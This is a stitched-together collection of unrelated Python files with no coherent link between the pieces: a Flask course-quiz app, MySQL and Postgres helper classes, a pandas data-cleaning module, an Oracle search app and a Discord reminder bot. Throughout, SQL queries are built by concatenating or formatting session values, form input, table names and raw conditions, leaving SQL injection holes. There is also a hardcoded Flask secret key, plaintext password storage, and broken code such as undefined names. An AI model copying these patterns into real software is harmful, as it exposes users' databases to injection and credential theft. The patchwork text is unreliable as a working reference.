            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))
            conn.commit()

            session['username'] = request.form['username']

            return redirect(url_for('instructions'))
        else: 
            error = "Username is already in use."

    #return "You are already registered" #render html for register page and send error message
    return render_template('createAccount.html', error=error) 

#levelPage1
@app.route('/levelPage1')
def levelPage1():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute("SELECT * from Users where emailAccount='" + session['username'] + "'")                    
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]

		if status180 is 1:
			status180 = 0;
		else:
			status180 = 1;

		if status240 is 1:
			status240 = 0;
		else:
			status240 = 1;

		if status250 is 1:
			status250 = 0;
		else:
			status250 = 1;
		
		if status251 is 1:
			status251 = 0;
		else:
			status251 = 1;

		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 1,
			'classes': [
					{
						'name': 'CS 180', 
						'status': status180
					}, 
					{
						'name':'CS 240', 
						'status':status240
					}, 
					{
						'name':'CS 250',
						'status':status250
					}, 
					{
						'name':'CS 251', 
						'status':status251
					} 
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict) 


		#return render_template('levelPage1.html')
	return redirect(url_for('login'))

@app.route('/levelPage2')
def levelPage2():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute("SELECT * from Users where emailAccount='" + session['username'] + "'")                    
		data = cursor.fetchone()
		#print(data);

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]


		#From database: 0 is not completed, 1 is completed
		#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met
		#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses
		if ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):
			status314 = 2;
			status334 = 2;
			status381 = 2;
			status307 = 2;
		else: 
			if status314 is 1:
				status314 = 0;
			else:
				status314 = 1;

			if status334 is 1:
				status334 = 0;
			else:
				status334 = 1;

			if status381 is 1:
				status381 = 0;
			else:
				status381 = 1;
			
			if status307 is 1:
				status307 = 0;
			else:
				status307 = 1;


		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 2,
			'classes': [
					{
						'name':'CS 307', 
						'status':status307
					},
					{
						'name': 'CS 314', 
						'status': status314
					}, 
					{
						'name':'CS 334', 
						'status':status334
					}, 
					{
						'name':'CS 381',
						'status':status381
					} 
					
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict)

		#return render_template('levelPage2.html')
	return redirect(url_for('login'))

@app.route('/levelPage3')
def levelPage3():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute("SELECT * from Users where emailAccount='" + session['username'] + "'")                    
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]
		status448 = data[11]
		status456 = data[12]
		status426 = data[14]
		status422 = data[13]

		if (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):
			status448 = 2
			status456 = 2
			status426 = 2
			status422 = 2
		else: 		
			if status448 is 1:
				status448 = 0
			else:
				status448 = 1

			if status456 is 1:
				status456 = 0
			else:
				status456 = 1

			if status426 is 1:
				status426 = 0
			else:
				status426 = 1

			if status422 is 1:
				status422 = 0
			else:
				status422 = 1

		try:
			# Create an instance for filling up classData
			levelDict = {
			'level': 3,
			'classes': [
				{
					'name':"CS 422", 
					'status':status422
				},
				{
					'name':"CS 426",
					'status':status426
				},
				{
					'name': "CS 448", 
					'status':status448
				}, 
				{
					'name':"CS 456", 
					'status':status456
				}, 
				
				
			]}
			
		except Exception ,e:
			print str(e)

		return jsonify(levelDict)

	return redirect(url_for('login'))


@app.route('/overview/<classNum>')
def overview(classNum):
	if 'username' in session:
		classNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]

		#Save the current course as a session variable.
		session['currentCourse'] = classNoSpace

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute("SELECT courseName,courseOverview from courses where courseAbbreviation='" + classNoSpace + "'")                    
		data = cursor.fetchone()

		return render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])

	return redirect(url_for('index'))


#Logout

@app.route('/lastCourseEntered')
def lastCourseEntered():
	if 'username' in session:
		if 'lastCourseEntered' in session:
			return jsonify(session['lastCourseEntered'])
		else:
			return jsonify("None")
	return redirect(url_for('login'))

@app.route('/logout')
def logout(): 
	session.pop('username', None)
	return redirect(url_for('index'))


@app.route('/levels')
def levels(): 
	if 'username' in session:
		return render_template('hallway.html')
	return redirect(url_for('login'))


@app.route('/quiz', methods=['GET', 'POST'])
def quiz():

	error = None
	answers = None
	grades = None
	showSubmit = None
	course = None
	rank = None

	if 'username' in session:

		if 'currentCourse' in session:
			course = session['currentCourse']
		else:
			return redirect(url_for('levels'))

		conn = mysql.connect()
		cursor = conn.cursor()
		cursor.execute("SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation='" + course + "'")                    

		questions = []
		for row in cursor:
			questions.append(row)

		if request.method == 'POST':
			#print request.form

			if (len(request.form) != 7):
				error = "Please answer all of the questions."
				showSubmit = True
			else:
				grades = []
				answers = []
				score = 0

				for i in range(0, len(request.form) - 2):
					answers.append(int(request.form["q" + str(i+1)]))

					if ( int(questions[i][5]) == answers[i] ):
						grades.append(1)
						score = score + 1
					else:
						grades.append(0)

				rank = request.form["rankquiz"]

				total = score + 3*int(rank)

				cursor.execute("SELECT courseId FROM courses WHERE courseAbbreviation='" + course +"'")                    
				courseId = cursor.fetchone()

				cursor.execute("SELECT courseConcentration FROM courses WHERE courseAbbreviation='" + course +"'")                    
				courseConcentration = cursor.fetchone()

				cursor.execute("DELETE FROM results WHERE emailAccount='" + session['username'] + "' and courseId=" + str(courseId[0]))                    

				#print "INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('" + session['username'] + "'," + str(courseId[0]) + ",'" + str(courseConcentration[0]) + "'," + str(score) + "," + str(rank) + "," + str(total) + ")"
				cursor.execute("INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('" + session['username'] + "'," + str(courseId[0]) + ",'" + str(courseConcentration[0]) + "'," + str(score) + "," + str(rank) + "," + str(total) + ")")
				cursor.execute("UPDATE users SET " + course.lower() + "Completed=1 WHERE emailAccount='" + session['username'] + "'")                    
				conn.commit()

				session['lastCourseEntered'] = session['currentCourse']
				session.pop('currentCourse', None)
				
				rank = int(rank)
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
		else:
			showSubmit = True
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
	return redirect(url_for('login'))

@app.route('/summary', methods=['GET'])
def summary():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		#select the maximum score from the results table
		cursor.execute("SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount='" + session['username'] + "'");
		courseConcentration = cursor.fetchone()

		return render_template('summary.html', courseConcentration = courseConcentration[0])
	return redirect(url_for('login'))

#Secret Key
app.secret_key = 'A0Zr98j/3yX R~'

import pymysql.cursors
from datetime import date, datetime
import json
import config

class Database:
	def __init__(self):
		self.conn = pymysql.connect(user=config.mysql_credentials["user"], \
									password=config.mysql_credentials["password"], \
									host=config.mysql_credentials["host"], \
									db=config.mysql_credentials["database"],
									cursorclass=pymysql.cursors.DictCursor)
		self.cur = self.conn.cursor()

	def __enter__(self):
		return DBase()

	def __exit__(self, exc_type, exc_val, exc_tb):
		if self.conn:
			self.cur.close()
			self.conn.close()

	def insert_query_log(self, lhash, text, search, qhash, ip, browser): 	
		sql = "INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES" + \
					"({}, {}, {}, '{}', '{}', '{}', {}, {})".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)
		self.cur.execute(sql)                    
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):
		sql = "INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES" + \
					"('%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion)                    
		self.cur.execute(sql)                    
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):
		sql = "INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES" + \
					"('%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (qhash, datetime.now(), is_know, reason, label, ip, browser)                    
		self.cur.execute(sql)                    
		self.conn.commit()
		return self.cur.lastrowid

	def insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):
		print(str(ahash))
		print(str(is_relevant))
		sql = "INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES" + \
					"('%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (ahash, datetime.now(), is_relevant, reason, label, ip, browser)                    
		self.cur.execute(sql)                    
		self.conn.commit()
		return self.cur.lastrowid

	def insert_references(self, qid, articles):
		insert_values = []
		for article in articles:
			insert_values.append((qid, str(article["qhash"]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) 	
		sql = "INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES" + \
				",".join("(%s, %s, %s, %s, %s, %s, %s)" for _ in insert_values)
		flattened_values = [item for sublist in insert_values for item in sublist]
		self.cur.execute(sql, flattened_values)
		self.conn.commit()

	def is_query_exist(self, loghash):
		sql = "SELECT id FROM log_query WHERE log_hash = '%s'" % (loghash)
		self.cur.execute(sql)                    
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def is_reference_exist(self, ahash):
		sql = "SELECT id FROM article_reference WHERE article_hash = '%s'" % (ahash)
		self.cur.execute(sql)                    
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def get_query_by_loghash(self, loghash):
		sql = "SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1" % (loghash)
		self.cur.execute(sql)                    
		self.conn.commit()
		query = self.cur.fetchone()
		return query

	def get_query_log(self):
		sql = "SELECT * FROM log_query ORDER BY query_time DESC"
		self.cur.execute(sql)                    
		self.conn.commit()
		queries = []
		for row in self.cur.fetchall():
			query = {}
			query["log_hash"] = row["log_hash"]
			query["query_text"] = row["query_text"]
			query["query_search"] = row["query_search"]
			query["query_hash"] = row["query_hash"]
			query["query_time"] = str(row["query_time"])
			query["client_ip"] = row["client_ip"]
			query["client_browser"] = row["client_browser"]
			query["clicked"] = row["clicked"]
			queries.append(query)
		return queries

	def del_reference_by_qhash(self, qhash):
		sql = "DELETE FROM article_reference WHERE query_hash = '%s'" % (qhash)
		self.cur.execute(sql)                    
		self.conn.commit()		

	def get_reference_by_qhash(self, qhash):
		sql = "SELECT * FROM article_reference WHERE query_hash = '%s'" % (qhash)
		self.cur.execute(sql)                    
		self.conn.commit()
		articles = []
		if (self.cur.rowcount > 0):
			for row in self.cur.fetchall():
				article = {}
				article["hash"] = row["article_hash"]
				article["date"] = row["article_date"]
				article["url"] = row["article_url"]
				article["content"] = row["article_content"]
				articles.append(article)
		return articles

	def get_reference_feedback(self):
		## VIWEW HELPER #1
		sql = "CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label"
		self.cur.execute(sql)                    
		self.conn.commit()

		## VIWEW HELPER #2
		sql = "CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))"
		self.cur.execute(sql)                    
		self.conn.commit()

		## THE QUERY
		sql = "SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query"
		self.cur.execute(sql)                    
		self.conn.commit()

		feedbacks = {}
		for row in self.cur.fetchall():
			feedback = {}
			feedback["query_text"] = row["query_text"]
			feedback["query_search"] = row["query_search"]
			feedback["article_content"] = row["article_content"]
			feedback["is_relevant"] = row["is_relevant"]
			feedback["feedback_label"] = row["feedback_label"]
			#feedbacks.append(feedback)
			if not (row["id"] in feedbacks):
				feedbacks[row["id"]] = []
			feedbacks[row["id"]].append(feedback)
		return feedbacks

	def check_query(self, qhash): 	
		sql = "INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES" + \
					"({}, {}, '{}', '{}', '{}', {})".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))
		self.cur.execute(sql)                    
		self.conn.commit()


from app import database as db
import pandas as pd
import re
import numpy as np


def rename_attribute(table_name, column, new_name):
    try:
        db.engine.execute(                    
            'ALTER TABLE {0} '
            'RENAME COLUMN "{1}" TO "{2}"'
            .format(table_name, column, new_name)
        )
    except Exception as e:
        print("RENAMING FAILED: "+str(e))


def delete_attribute(table_name, column):
    try:
        db.engine.execute(                    
            'ALTER TABLE {0} '
            'DROP COLUMN "{1}"'
            .format(table_name, column)
        )
    except:
        print("DELETING FAILED")


def restore_original(table_name):
    """
    Resets given table to its original state
    :param table_name: name of the the table to be reset
    """
    try:
        # Original tables are prepended with og
        # Thus we replace wc with og and have the name of the table
        # with the original data
        original = 'og' + table_name[2:]
        db.engine.execute(                    
            'DROP TABLE "{0}"'.format(table_name)
        )
        db.engine.execute(                    
            'CREATE TABLE "{0}" AS SELECT * FROM "{1}"'
            .format(table_name, original)
        )
    except:
        print("FAILED TO RESTORE ORIGINAL")


def change_attribute_type(table_name, table_col, new_type):
    """
    Changes the type of given attribute in given table to new_type
    :param table_name: table containing the attribute
    :param table_col: attribute to change type of
    :param new_type: new type
    """
    current_type = db.engine.execute(                    
        'SELECT data_type from information_schema.columns '
        'where table_name = \'{0}\' and column_name = \'{1}\';'
        .format(table_name, table_col)
    ).fetchall()[0][0]
    if new_type == 'INTEGER':
        db.engine.execute(                    
            'ALTER TABLE {0} '
            'ALTER COLUMN "{1}" '
            'TYPE BIGINT USING "{1}"::bigint'
            .format(table_name, table_col))
    if new_type == 'DOUBLE':
        db.engine.execute(                    
            'ALTER TABLE {0} '
            'ALTER COLUMN "{1}" '
            'TYPE DOUBLE PRECISION USING "{1}"::double precision'
            .format(table_name, table_col))
    if new_type == 'TEXT':
        if current_type == 'date':
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE TEXT USING to_char("{1}", \'DD/MM/YYYY\')'
                .format(table_name, table_col))
        elif current_type == 'timestamp with time zone':                    
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE TEXT USING to_char("{1}", \'DD/MM/YYYY HH24:MI:SS\')'
                .format(table_name, table_col))
        else:
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE TEXT'
                .format(table_name, table_col))
    if new_type == 'DATE':
        if current_type == 'timestamp with time zone':
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE DATE'
                .format(table_name, table_col))
        else:
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE DATE USING to_date("{1}", \'DD/MM/YYYY\')'
                .format(table_name, table_col))
    if new_type == 'TIMESTAMP':
        if current_type == 'date':
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE TIMESTAMP WITH TIME ZONE'
                .format(table_name, table_col))
        else:
            db.engine.execute(                    
                'ALTER TABLE {0} '
                'ALTER COLUMN "{1}" '
                'TYPE TIMESTAMP WITH TIME ZONE '
                'USING to_timestamp("{1}", \'DD/MM/YYYY HH24:MI:SS\')'
                .format(table_name, table_col))


def drop_attribute(table_name, attr):
    """
    Drops given attribute from given table
    :param table_name: table to perform the operation on
    :param attr: attribute to drop
    """
    try:
        db.engine.execute(                    
            'ALTER TABLE "{0}" DROP COLUMN IF EXISTS "{1}"'.
            format(table_name, attr)
        )
    except:
        print("FAILED TO DROP ATTRIBUTE {0} FROM {1}".format(attr, table_name))


def one_hot_encode(table_name, attr):
    """
    One hot encodes given attribute
    :param table_name: table on which to perform the operation
    :param attr: attribute to one hot encode
    :return:
    """
    try:
        dataframe = pd.read_sql_table(table_name, db.engine)
        one_hot = pd.get_dummies(dataframe[attr])
        print('OH', one_hot)
        dataframe = dataframe.join(one_hot)
        print('DF', dataframe)
        db.engine.execute(                    
            'DROP TABLE "{0}"'.format(table_name)
        )
        dataframe.to_sql(
            name=table_name,
            con=db.engine,
            if_exists="fail",
            index=False
        )
    except:
        print('ONE-HOT ENCODING FAILED')


def fill_null_with(table_name, attr, value, text_type):
    """
    Fills all NULL values with provided value in table_name.attr
    :param table_name: table to perform the operation on
    :param attr: attribute containing NULL values
    :param text_type: indicates whether column is a text type
    :param value: value to insert
    """
    try:
        if text_type:
            db.engine.execute(                    
                'UPDATE "{0}" '
                'SET "{1}" = \'{2}\' '
                'WHERE ("{1}" = \'\') IS NOT FALSE'
                .format(table_name, attr, value)
            )
        else:
            db.engine.execute(                    
                'UPDATE "{0}" '
                'SET "{1}" = {2} '
                'WHERE "{1}" IS NULL'
                .format(table_name, attr, value)
            )
    except Exception as e:
        print('FILL NULL FAILED WITH FOLLOWING MESSAGE:\n' + str(e))


def fill_null_with_average(table_name, attr):
    """
    Fills all NULL values with average value in table_name.attr
    :param table_name: table to perform the operation on
    :param attr: attribute containing NULL values
    """
    try:
        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])
        average = dataframe[attr].mean()
        db.engine.execute(                    
            'UPDATE "{0}" '
            'SET "{1}" = {2} '
            'WHERE "{1}" IS NULL'
            .format(table_name, attr, average)
        )
    except:
        print('FILL AVERAGE FAILED')


def fill_null_with_median(table_name, attr):
    """
    Fills all NULL values with median value in table_name.attr
    :param table_name: table to perform the operation on
    :param attr: attribute containing NULL values
    """
    try:
        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])
        median = dataframe[attr].median()
        db.engine.execute(                    
            'UPDATE "{0}" '
            'SET "{1}" = {2} '
            'WHERE "{1}" IS NULL'
            .format(table_name, attr, median)
        )
    except:
        print('FILL MEAN FAILED')


def find_replace(table_name, attr, find, replace):
    try:
        db.engine.execute(                    
            'UPDATE "{0}" '
            'SET "{1}" = \'{2}\' '
            'WHERE "{1}" = \'{3}\' '
            .format(table_name, attr, replace, find)
        )
    except:
        print('FIND-REPLACE FAILED')


def substring_find_replace(table_name, attr, find, replace, full=False):
    try:
        if full:
            db.engine.execute(                    
                'UPDATE "{0}" '
                'SET "{1}" = \'{2}\' '
                'WHERE "{1}" LIKE \'%%{3}%%\' '
                .format(table_name, attr, replace, find)
            )
        else:
            db.engine.execute(                    
                'UPDATE "{0}" '
                'SET "{1}" = REPLACE("{1}", \'{2}\', \'{3}\')'
                .format(table_name, attr, find, replace)
            )
    except Exception as e:
        print('FIND-REPLACE FAILED\n' + str(e))


def regex_find_replace(table_name, attr, regex, replace):
    try:
        is_valid = True
        try:
            re.compile(regex)
        except re.error:
            is_valid = False
        if is_valid:
            db.engine.execute(                    
                'UPDATE "{0}" '
                'SET "{1}" = REGEXP_REPLACE("{1}", \'{2}\', \'{3}\')'
                .format(table_name, attr, regex, replace)
            )
    except Exception as e:
        print('REGEX FIND-REPLACE FAILED:\n' + str(e))


def normalize_attribute(table_name, attr):
    """
    Normalizes table_name.attr using z-score method
    :param table_name: table to perform the operation on
    :param attr: attribute to normalize
    """
    try:
        df = pd.read_sql_table(table_name, db.engine)
        df[attr] = (df[attr] - df[attr].mean()) / df[attr].std(ddof=0)
        db.engine.execute(                    
            'DROP TABLE "{0}"'.format(table_name)
        )
        df.to_sql(name=table_name, con=db.engine, if_exists="fail", index=False)
    except:
        print('NORMALIZATION FAILED')


def remove_outliers(table_name, attr, value, smaller_than=False):
    """
    Removes outliers based on provided value
    :param table_name: table to perform the operation on
    :param attr: attribute to search for outliers
    :param value: extrema value
    :param smaller_than:  if true values smaller than are filtered,
                          values greater than otherwise
    """
    try:
        if smaller_than:
            db.engine.execute(                    
                'DELETE FROM "{0}" '
                'WHERE "{1}" < {2}'
                .format(table_name, attr, value)
            )
        else:  # greater than
            db.engine.execute(                    
                'DELETE FROM "{0}" '
                'WHERE "{1}" > {2}'
                .format(table_name, attr, value)
            )
    except:
        print('REMOVE OUTLIERS FAILED')


def delete_rows(table_name, condition):

    db.engine.execute(                    
        'DELETE FROM "{0}" WHERE {1}'.format(table_name, condition)
    )


def discretize_width(table_name, attr, intervals, dataframe=None, name=None):
    """
    Discretizes table_name.attr into a number of equal-width
    intervals equal to interval amount
    :param table_name: table to perform operation on
    :param attr: attribute to discretize
    :param intervals:
        - int: number of equal width intervals
        - [int]: non-uniform interval edges
    :param dataframe: Dataframe if data has already been read from sql
    """
    try:
        if dataframe is not None:
            df = dataframe
        else:
            df = pd.read_sql_table(table_name, db.engine)
        if name is not None:
            column_name = name
        elif isinstance(intervals, list):
            column_name = attr + '_custom_intervals'
        else:
            column_name = attr + '_' + str(intervals) + '_eq_intervals'

        df[column_name] = pd.cut(df[attr], intervals, precision=9).apply(str)
        db.engine.execute(                    
            'DROP TABLE "{0}"'.format(table_name)
        )
        df.to_sql(name=table_name, con=db.engine, if_exists="fail", index=False)
    except Exception as e:
        print('WIDTH DISCRETIZATION FAILED:\n' + str(e))


def discretize_eq_freq(table_name, attr, intervals):
    """
    Discretizes table_name.attr into a number of equal-frequency
    intervals equal to intervals
    :param table_name: table to perform operation on
    :param attr: attribute to discretize
    :param intervals: number of equal frequency intervals
    """
    try:
        df = pd.read_sql_table(table_name, db.engine)
        attr_length = len(df[attr])
        elements_per_interval = attr_length//intervals
        sorted_data = list(df[attr].sort_values())
        selector = 0
        edge_list = []
        while selector < attr_length:
            try:
                edge_list.append(sorted_data[selector])
                selector += elements_per_interval
            except IndexError:
                pass
        if edge_list[-1] != sorted_data[-1] and len(edge_list) == intervals + 1:
            edge_list[-1] = sorted_data[-1]
        elif edge_list[-1] != sorted_data[-1] and len(edge_list) != intervals + 1:
            edge_list.append(sorted_data[-1])

        # Extend outer edges with 0.1% to include min and max values
        edge_list[0] = edge_list[0]-edge_list[0]*0.001
        edge_list[-1] = edge_list[-1]+edge_list[-1]*0.001

        column_name = attr + '_' + str(intervals) + '_eq_freq_intervals'

        discretize_width(table_name, attr, edge_list, df, column_name)
    except Exception as e:
        print('EQUAL FREQUENCY DISCRETIZATION FAILED:\n' + str(e))

#!bin/env python

import asyncpg

class PGDB:
    def __init__(self, db_conn):
        self.db_conn = db_conn

    async def fetch_user_info(self, member_id: int, column: str):
        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''
        return await self.db_conn.fetchval(query)

    async def insert_user_info(self, member_id: int, column: str, col_value):
        execute = (
            f"""INSERT INTO user_info (member_id, {column})                     
                    VALUES ({member_id}, {col_value})                    
                    ON CONFLICT (member_id)                    
                        DO UPDATE SET {column} = {col_value};""")                    
        await self.db_conn.execute(execute)                    

from flask import Flask, g, render_template, request, jsonify                    
from utils import get_db, get_queries, shutdown, ajax, execute_query, generic_search                    
import os
import atexit

app = Flask(__name__)

# Register clean up function
atexit.register(shutdown, app=app, context=g)                    

# Set app configuration
app.config.update({'DB_USER': os.environ['IDBS_USER'],
                   'DB_PWD': os.environ['IDBS_PWD'],
                   'DB_SERVER': 'diassrv2.epfl.ch',
                   'DB_PORT': 1521,
                   'DB_SID': 'orcldias',
                   'DEBUG': True,
                   'QUERIES_PATH': 'queries.sql'})


@app.route('/')
def home():
    con = get_db(app, g)                    
    return render_template('index.html')


@app.route('/search', methods=['GET', 'POST'])
@ajax
def search():
    # If GET, return the form to render
    if request.method == 'GET':
        return render_template('search-form.html')

    # If POST, process the query and return data
    keywords = request.form['keywords']
    tables = list(request.form.keys())
    tables.remove('keywords')

    data = generic_search(keywords, tables, app, g)                    
    return jsonify(data)                    


@app.route('/queries', methods=['GET', 'POST'])
@ajax
def queries():
    if request.method == 'GET':
        return render_template('queries-form.html', queries=get_queries(app, g))                    

    # Get query and execute it
    query_key = request.form['query-selector']
    query = get_queries(app, g)[query_key]                    
    (schema, data) = execute_query(app, g, query)                    

    return jsonify([('', schema, data)])


@app.route('/get_table_names', methods=['GET'])
@ajax
def get_table_names():
    query = 'SELECT table_name FROM user_tables'                    
    data = execute_query(app, g, query)[1]                    
    return jsonify(data)                    

from flask import abort, request                    
from functools import wraps
import cx_Oracle
import re


def get_db(app, context):                    
    """ Connect to the database and return connection """                    
    if not hasattr(context, 'db'):                    
        dsn_tns = cx_Oracle.makedsn(app.config['DB_SERVER'],                    
                                    app.config['DB_PORT'],                    
                                    app.config['DB_SID'])                    

        context.db = cx_Oracle.connect(app.config['DB_USER'],                    
                                       app.config['DB_PWD'],                    
                                       dsn_tns)                    

    return context.db                    


def get_queries(app, context):                    
    """ Parse and return predefined queries """                    
    if not hasattr(context, 'queries'):                    
        with open(app.config['QUERIES_PATH'], 'r') as fd:                    
            sqlFile = fd.read()                    

        # all SQL commands (split on ';')
        sqlCommands = sqlFile.split(';')                    
        context.queries = {}                    
        for command in sqlCommands:                    
            command = re.sub(r'\s*--\s*|\s*\n\s*', ' ', command)                    
            query = command.split(':')                    
            context.queries[query[0]] = query[1]                    

    return context.queries                    


def execute_query(app, context, query):                    
    """ Execute a query and return corresponding data """
    # Execute query
    con = get_db(app, context)                    
    cur = con.cursor()
    cur.execute(query)                    

    # Return data with description
    return (extract_schema(cur.description), cur.fetchall())


def generic_search(keywords, tables, app, context):                    
    # List of tuples (table_name, schema, tuples)
    result = []
    for table in tables:
        # Get columns for the table
        query = 'SELECT * FROM {} WHERE 1=0'.format(table)                    
        description = execute_query(app, context, query)[0]                    

        # Build conditions
        conditions = []
        for col in description:                    
            conditions.append('{} LIKE \'%{}%\''.format(col, keywords))                    

        conditions = ' OR '.join(conditions)

        # Execute query
        query = 'SELECT * FROM {} WHERE {}'.format(table, conditions)
        (schema, data) = execute_query(app, context, query)                    
        result.append((table, schema, data))                    

    return result


def extract_schema(description):
    names = []
    for col in description:                    
        names.append(col[0])

    return names


def shutdown(app, context):                    
    """ Clean-up application state before shutdown """                    
    with app.app_context():                    
        get_db(app, context).close()                    


def ajax(f):
    """ Custom decoractor to restrict acces to AJAX calls """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not request.is_xhr:
            return abort(401)
        return f(*args, **kwargs)
    return decorated_function

from datetime import datetime, timedelta
from time import localtime, strftime
import sqlite3


# Get the new date from string time/date
def get_date(time):
    now = datetime.now()
    if ',' in time:
        times = time.split(',')
        for t in times:
            val = t
            if 's' in val:
                val = val.replace('s', '')
                now += timedelta(seconds=int(val))
            elif 'm' in val:
                val = val.replace('m', '')
                now += timedelta(minutes=int(val))
            elif 'h' in val:
                val = val.replace('h', '')
                now += timedelta(hours=int(val))
            elif 'd' in val:
                val = val.replace('d', '')
                now += timedelta(days=int(val))
    else:
        val = time
        if 's' in val:
            val = val.replace('s', '')
            now += timedelta(seconds=int(val))
        elif 'm' in val:
            val = val.replace('m', '')
            now += timedelta(minutes=int(val))
        elif 'h' in val:
            val = val.replace('h', '')
            now += timedelta(hours=int(val))
        elif 'd' in val:
            val = val.replace('d', '')
            now += timedelta(days=int(val))
    return now


# RemindMe command
async def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute("INSERT INTO reminder (type, channel, message, date) VALUES ('0', {}, '{}', '{}');"                    
                               .format(author_id, msg, date.strftime('%Y-%m-%d %X')))                    
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime("%b %d, %Y %X", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime("%b %d, %Y %X", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
